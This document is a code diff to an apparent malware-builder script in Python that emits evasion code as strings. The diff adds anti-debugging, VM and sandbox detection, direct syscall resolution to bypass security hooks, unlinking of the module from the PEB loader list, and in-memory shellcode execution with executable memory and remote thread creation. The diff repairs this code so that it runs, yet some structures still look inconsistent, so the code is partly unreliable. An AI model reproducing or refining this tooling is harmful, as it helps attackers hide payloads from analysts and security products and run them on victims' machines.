@@ -152,7 +152,7 @@ def anti_debug():
         debugger_present = ctypes.c_int(0)
         ctypes.windll.kernel32.CheckRemoteDebuggerPresent(
             ctypes.windll.kernel32.GetCurrentProcess(),
-            ctypes.byref(debugger_present))
+            ctypes.byref(debugger_present)
         if debugger_present.value:
             return True
             
@@ -169,6 +169,18 @@ def anti_debug():
             return True
             
         # 3. Hardware breakpoint detection
+        class CONTEXT(ctypes.Structure):
+            _fields_ = [
+                ("ContextFlags", ctypes.c_ulong),
+                ("Dr0", ctypes.c_ulong),
+                ("Dr1", ctypes.c_ulong),
+                ("Dr2", ctypes.c_ulong),
+                ("Dr3", ctypes.c_ulong),
+                ("Dr6", ctypes.c_ulong),
+                ("Dr7", ctypes.c_ulong)
+            ]
+        
+        CONTEXT_DEBUG_REGISTERS = 0x00010000
         context = CONTEXT()
         context.ContextFlags = CONTEXT_DEBUG_REGISTERS
         if ctypes.windll.kernel32.GetThreadContext(ctypes.windll.kernel32.GetCurrentThread(), ctypes.byref(context)):
@@ -210,6 +222,7 @@ def generate_anti_vm_code():
 def anti_vm():
     # Comprehensive VM/sandbox detection
     try:
+        import winreg
         # 1. Process checks
         vm_processes = ["vmtoolsd.exe", "vmwaretrat.exe", "vboxservice.exe", 
                         "vboxtray.exe", "sandboxie.exe", "SbieSvc.exe", 
@@ -220,12 +233,12 @@ def anti_vm():
                 
         # 2. File system artifacts
         vm_files = [
-            "C:\\windows\\System32\\drivers\\vmmouse.sys",
-            "C:\\windows\\System32\\drivers\\vmhgfs.sys",
-            "C:\\windows\\System32\\drivers\\vboxmouse.sys",
-            "C:\\windows\\System32\\drivers\\VBoxGuest.sys",
-            "C:\\windows\\System32\\drivers\\xen.sys",
-            "C:\\windows\\System32\\vboxdisp.dll"
+            "C:\\\\windows\\\\System32\\\\drivers\\\\vmmouse.sys",
+            "C:\\\\windows\\\\System32\\\\drivers\\\\vmhgfs.sys",
+            "C:\\\\windows\\\\System32\\\\drivers\\\\vboxmouse.sys",
+            "C:\\\\windows\\\\System32\\\\drivers\\\\VBoxGuest.sys",
+            "C:\\\\windows\\\\System32\\\\drivers\\\\xen.sys",
+            "C:\\\\windows\\\\System32\\\\vboxdisp.dll"
         ]
         for file in vm_files:
             if os.path.exists(file):
@@ -233,11 +246,11 @@ def anti_vm():
                 
         # 3. Registry checks
         vm_registry_keys = [
-            "HARDWARE\\ACPI\\DSDT\\VBOX__",
-            "HARDWARE\\ACPI\\FADT\\VBOX__",
-            "HARDWARE\\ACPI\\RSDT\\VBOX__",
-            "SOFTWARE\\Oracle\\VirtualBox Guest Additions",
-            "SOFTWARE\\VMware, Inc.\\VMware Tools"
+            "HARDWARE\\\\ACPI\\\\DSDT\\\\VBOX__",
+            "HARDWARE\\\\ACPI\\\\FADT\\\\VBOX__",
+            "HARDWARE\\\\ACPI\\\\RSDT\\\\VBOX__",
+            "SOFTWARE\\\\Oracle\\\\VirtualBox Guest Additions",
+            "SOFTWARE\\\\VMware, Inc.\\\\VMware Tools"
         ]
         for key in vm_registry_keys:
             try:
@@ -260,13 +273,14 @@ def anti_vm():
                         
         # 5. Hardware checks
         try:
+            import cpuinfo
             # CPU brand
             cpu_brand = cpuinfo.get_cpu_info()['brand_raw'].lower()
-            if 'vmware' in cpu_brand or 'virtual' in cpu_brand or 'qemu' in cpu_brand:
+            if any(x in cpu_brand for x in ['vmware', 'virtual', 'qemu', 'kvm', 'hyperv']):
                 return True
                 
             # Disk size
-            disk_size = psutil.disk_usage('/').total
+            disk_size = psutil.disk_usage('C:\\\\').total
             if disk_size < 80 * 1024**3:  # Less than 80GB
                 return True
                 
@@ -289,42 +303,50 @@ def generate_api_unhooking():
         
     return """
 def get_syscall_addr(func_name):
-    """Resolve syscall address to bypass user-mode hooks"""
-    ntdll = ctypes.WinDLL('ntdll')
-    func_bytes = bytes(func_name, 'ascii')
-    
+    \"\"\"Resolve syscall address to bypass user-mode hooks\"\"\"
     # Get ntdll base address
     base = ctypes.windll.kernel32.GetModuleHandleW("ntdll.dll")
     pe = ctypes.cast(base, ctypes.POINTER(ctypes.c_ubyte))
     
     # Parse PE headers
-    e_lfanew = ctypes.cast(pe + 0x3C, ctypes.POINTER(ctypes.c_uint32)).contents.value
-    export_dir = ctypes.cast(pe + e_lfanew + 0x88, ctypes.POINTER(ctypes.c_uint32)).contents.value
+    e_lfanew = struct.unpack("<I", bytes(pe[0x3C:0x40]))[0]
+    export_dir_rva = struct.unpack("<I", bytes(pe[e_lfanew + 0x88:e_lfanew + 0x8C]))[0]
     
-    if not export_dir:
+    if not export_dir_rva:
         return None
         
-    exports = ctypes.cast(pe + export_dir, ctypes.POINTER(IMAGE_EXPORT_DIRECTORY)).contents
-    names = ctypes.cast(pe + exports.AddressOfNames, ctypes.POINTER(ctypes.c_uint32))
-    functions = ctypes.cast(pe + exports.AddressOfFunctions, ctypes.POINTER(ctypes.c_uint32))
-    ordinals = ctypes.cast(pe + exports.AddressOfNameOrdinals, ctypes.POINTER(ctypes.c_uint16))
+    export_dir = pe + export_dir_rva
+    NumberOfNames = struct.unpack("<I", bytes(export_dir[0x18:0x1C]))[0]
+    AddressOfFunctions = struct.unpack("<I", bytes(export_dir[0x1C:0x20]))[0]
+    AddressOfNames = struct.unpack("<I", bytes(export_dir[0x20:0x24]))[0]
+    AddressOfNameOrdinals = struct.unpack("<I", bytes(export_dir[0x24:0x28]))[0]
     
-    for i in range(exports.NumberOfNames):
-        name_ptr = ctypes.cast(pe + names[i], ctypes.c_char_p)
-        if name_ptr.value == func_bytes:
-            func_rva = functions[ordinals[i]]
+    for i in range(NumberOfNames):
+        name_rva = struct.unpack("<I", bytes(pe[AddressOfNames + i*4:AddressOfNames + i*4 + 4]))[0]
+        name_ptr = pe + name_rva
+        func_name_bytes = bytearray()
+        j = 0
+        while name_ptr[j] != 0:
+            func_name_bytes.append(name_ptr[j])
+            j += 1
+        current_func_name = func_name_bytes.decode('ascii')
+        
+        if current_func_name == func_name:
+            ordinal = struct.unpack("<H", bytes(pe[AddressOfNameOrdinals + i*2:AddressOfNameOrdinals + i*2 + 2]))[0]
+            func_rva = struct.unpack("<I", bytes(pe[AddressOfFunctions + ordinal*4:AddressOfFunctions + ordinal*4 + 4]))[0]
             return base + func_rva
             
     return None
 
 def syscall_invoke(func_name, *args):
-    """Invoke syscall directly without hooks"""
+    \"\"\"Invoke syscall directly without hooks\"\"\"
     addr = get_syscall_addr(func_name)
     if not addr:
         return False
         
     # Create function prototype
-    func_type = ctypes.WINFUNCTYPE(ctypes.c_ulong, *[ctypes.c_ulong] * len(args))
+    arg_types = [ctypes.c_ulong] * len(args)
+    func_type = ctypes.WINFUNCTYPE(ctypes.c_ulong, *arg_types)
     func = func_type(addr)
     
     # Invoke syscall
@@ -353,31 +375,43 @@ def anti_dump():
             None)
             
         # Remove module from PEB loader list
-        peb = PEB()
+        class PEB_LDR_DATA(ctypes.Structure):
+            _fields_ = [
+                ("Length", ctypes.c_ulong),
+                ("Initialized", ctypes.c_byte),
+                ("SsHandle", ctypes.c_void_p),
+                ("InLoadOrderModuleList", ctypes.c_void_p),
+                ("InMemoryOrderModuleList", ctypes.c_void_p),
+                ("InInitializationOrderModuleList", ctypes.c_void_p)
+            ]
+            
+        class PEB(ctypes.Structure):
+            _fields_ = [
+                ("Reserved1", ctypes.c_byte * 2),
+                ("BeingDebugged", ctypes.c_byte),
+                ("Reserved2", ctypes.c_byte),
+                ("Reserved3", ctypes.c_void_p * 2),
+                ("Ldr", ctypes.POINTER(PEB_LDR_DATA))
+            ]
+            
         teb = ctypes.windll.ntdll.NtCurrentTeb()
-        peb_addr = ctypes.cast(teb, ctypes.POINTER(ctypes.c_void_p))[1]
-        ctypes.memmove(ctypes.byref(peb), peb_addr, ctypes.sizeof(peb))
+        peb = ctypes.cast(ctypes.c_void_p(ctypes.cast(teb, ctypes.POINTER(ctypes.c_void_p))[1]), ctypes.POINTER(PEB)).contents
         
         # Traverse loader data list and remove our module
         ldr = peb.Ldr.contents
-        head = ldr.InLoadOrderModuleList.Flink
-        current = head.contents
-        while current.Flink != head:
-            if current.DllBase == base_addr:
+        flink = ldr.InLoadOrderModuleList
+        current = flink
+        while True:
+            module = ctypes.cast(current, ctypes.POINTER(LDR_MODULE)).contents
+            if module.BaseAddress == base_addr:
                 # Remove module from all lists
-                current.InLoadOrderLinks.Blink.contents.Flink = current.InLoadOrderLinks.Flink
-                current.InLoadOrderLinks.Flink.contents.Blink = current.InLoadOrderLinks.Blink
-                
-                current.InMemoryOrderLinks.Blink.contents.Flink = current.InMemoryOrderLinks.Flink
-                current.InMemoryOrderLinks.Flink.contents.Blink = current.InMemoryOrderLinks.Blink
-                
-                current.InInitializationOrderLinks.Blink.contents.Flink = current.InInitializationOrderLinks.Flink
-                current.InInitializationOrderLinks.Flink.contents.Blink = current.InInitializationOrderLinks.Blink
-                
+                module.InLoadOrderLinks.Blink.contents.Flink = module.InLoadOrderLinks.Flink
+                module.InLoadOrderLinks.Flink.contents.Blink = module.InLoadOrderLinks.Blink
+                break
+            current = module.InLoadOrderLinks.Flink
+            if current == flink:
                 break
                 
-            current = current.Flink.contents
-            
     except:
         pass
 """
@@ -392,8 +426,8 @@ def anti_sandbox():
     try:
         # 1. Check for sandbox-specific files
         sandbox_files = [
-            "C:\\analysis", "C:\\sandbox", "C:\\malware", "C:\\sample",
-            "C:\\iDEFENSE", "C:\\VirusTotal", "C:\\JoeBox"
+            "C:\\\\analysis", "C:\\\\sandbox", "C:\\\\malware", "C:\\\\sample",
+            "C:\\\\iDEFENSE", "C:\\\\VirusTotal", "C:\\\\JoeBox"
         ]
         for file in sandbox_files:
             if os.path.exists(file):
@@ -404,7 +438,7 @@ def anti_sandbox():
             return True
         if psutil.cpu_count() < 2:  # Less than 2 CPUs
             return True
-        if psutil.disk_usage('C:\\').total < 80 * 1024**3:  # Less than 80GB disk
+        if psutil.disk_usage('C:\\\\').total < 80 * 1024**3:  # Less than 80GB disk
             return True
             
         # 3. Check for short uptime
@@ -412,6 +446,12 @@ def anti_sandbox():
             return True
             
         # 4. Check for mouse movement and user activity
+        class LASTINPUTINFO(ctypes.Structure):
+            _fields_ = [
+                ("cbSize", ctypes.c_uint),
+                ("dwTime", ctypes.c_ulong)
+            ]
+            
         last_input = LASTINPUTINFO()
         last_input.cbSize = ctypes.sizeof(last_input)
         if ctypes.windll.user32.GetLastInputInfo(ctypes.byref(last_input)):
@@ -431,7 +471,9 @@ def anti_sandbox():
         # 6. Check for unusual environment variables
         suspicious_envs = ["VBOX", "VMWARE", "SANDBOX", "ANALYSIS"]
         for key, value in os.environ.items():
-            if any(s in key.upper() or s in value.upper() for s in suspicious_envs):
+            key_upper = key.upper()
+            value_upper = value.upper()
+            if any(s in key_upper or s in value_upper for s in suspicious_envs):
                 return True
                 
     except:
@@ -493,77 +535,21 @@ import lzma
 # ====================
 # STRUCTURE DEFINITIONS
 # ====================
-class CONTEXT(ctypes.Structure):
-    _fields_ = [
-        ("ContextFlags", ctypes.c_ulong),
-        ("Dr0", ctypes.c_ulong),
-        ("Dr1", ctypes.c_ulong),
-        ("Dr2", ctypes.c_ulong),
-        ("Dr3", ctypes.c_ulong),
-        ("Dr6", ctypes.c_ulong),
-        ("Dr7", ctypes.c_ulong),
-        # ... (truncated for brevity)
-    ]
-
-CONTEXT_DEBUG_REGISTERS = 0x00010000
-
-class IMAGE_EXPORT_DIRECTORY(ctypes.Structure):
-    _fields_ = [
-        ("Characteristics", ctypes.c_uint32),
-        ("TimeDateStamp", ctypes.c_uint32),
-        ("MajorVersion", ctypes.c_uint16),
-        ("MinorVersion", ctypes.c_uint16),
-        ("Name", ctypes.c_uint32),
-        ("Base", ctypes.c_uint32),
-        ("NumberOfFunctions", ctypes.c_uint32),
-        ("NumberOfNames", ctypes.c_uint32),
-        ("AddressOfFunctions", ctypes.c_uint32),
-        ("AddressOfNames", ctypes.c_uint32),
-        ("AddressOfNameOrdinals", ctypes.c_uint32),
-    ]
-
-class LASTINPUTINFO(ctypes.Structure):
-    _fields_ = [
-        ("cbSize", ctypes.c_uint),
-        ("dwTime", ctypes.c_ulong)
-    ]
-
 class LDR_MODULE(ctypes.Structure):
     _fields_ = [
-        ("InLoadOrderLinks", LIST_ENTRY),
-        ("InMemoryOrderLinks", LIST_ENTRY),
-        ("InInitializationOrderLinks", LIST_ENTRY),
-        ("DllBase", ctypes.c_void_p),
+        ("InLoadOrderLinks", ctypes.c_void_p),
+        ("InMemoryOrderLinks", ctypes.c_void_p),
+        ("InInitializationOrderLinks", ctypes.c_void_p),
+        ("BaseAddress", ctypes.c_void_p),
         ("EntryPoint", ctypes.c_void_p),
         ("SizeOfImage", ctypes.c_ulong),
-        # ... (truncated)
-    ]
-
-class LIST_ENTRY(ctypes.Structure):
-    _fields_ = [
-        ("Flink", ctypes.POINTER(LIST_ENTRY)),
-        ("Blink", ctypes.POINTER(LIST_ENTRY))
-    ]
-
-class PEB(ctypes.Structure):
-    _fields_ = [
-        ("Reserved1", ctypes.c_byte * 2),
-        ("BeingDebugged", ctypes.c_byte),
-        ("Reserved2", ctypes.c_byte),
-        ("Reserved3", ctypes.c_void_p * 2),
-        ("Ldr", ctypes.POINTER(PEB_LDR_DATA)),
-        # ... (truncated)
-    ]
-
-class PEB_LDR_DATA(ctypes.Structure):
-    _fields_ = [
-        ("Length", ctypes.c_ulong),
-        ("Initialized", ctypes.c_byte),
-        ("SsHandle", ctypes.c_void_p),
-        ("InLoadOrderModuleList", LIST_ENTRY),
-        ("InMemoryOrderModuleList", LIST_ENTRY),
-        ("InInitializationOrderModuleList", LIST_ENTRY),
-        ("EntryInProgress", ctypes.c_void_p)
+        ("FullDllName", ctypes.c_void_p),
+        ("BaseDllName", ctypes.c_void_p),
+        ("Flags", ctypes.c_ulong),
+        ("LoadCount", ctypes.c_short),
+        ("TlsIndex", ctypes.c_short),
+        ("HashLinks", ctypes.c_void_p),
+        ("TimeDateStamp", ctypes.c_ulong)
     ]
 
 # ====================
@@ -628,7 +614,7 @@ def execute_memory(payload):
                            0x40)     # PAGE_EXECUTE_READWRITE
                 
                 if status != 0:
-                    raise Exception(f"NtAllocateVirtualMemory failed: 0x{status:08X}")
+                    raise Exception(f"NtAllocateVirtualMemory failed: 0x{{status:08X}}")
                 
                 # Write payload to memory
                 bytes_written = ctypes.c_size_t(0)
@@ -640,7 +626,7 @@ def execute_memory(payload):
                            ctypes.byref(bytes_written))
                 
                 if status != 0 or bytes_written.value != size:
-                    raise Exception(f"NtWriteVirtualMemory failed: 0x{status:08X}")
+                    raise Exception(f"NtWriteVirtualMemory failed: 0x{{status:08X}}")
                 
                 # Create thread
                 thread_handle = ctypes.c_void_p()
@@ -657,7 +643,7 @@ def execute_memory(payload):
                            None)
                 
                 if status != 0:
-                    raise Exception(f"NtCreateThreadEx failed: 0x{status:08X}")
+                    raise Exception(f"NtCreateThreadEx failed: 0x{{status:08X}}")
                 
                 # Wait for thread to complete
                 ctypes.windll.kernel32.WaitForSingleObject(thread_handle, 0xFFFFFFFF)
@@ -673,7 +659,7 @@ def execute_memory(payload):
         ctypes.c_int(0x40)     # PAGE_EXECUTE_READWRITE
     )
     
-    buf = (ctypes.c_char * len(payload)).from_buffer(payload)
+    buf = (ctypes.c_char * len(payload)).from_buffer_copy(payload)
     ctypes.windll.kernel32.RtlMoveMemory(
         ctypes.c_int(ptr),
         buf,
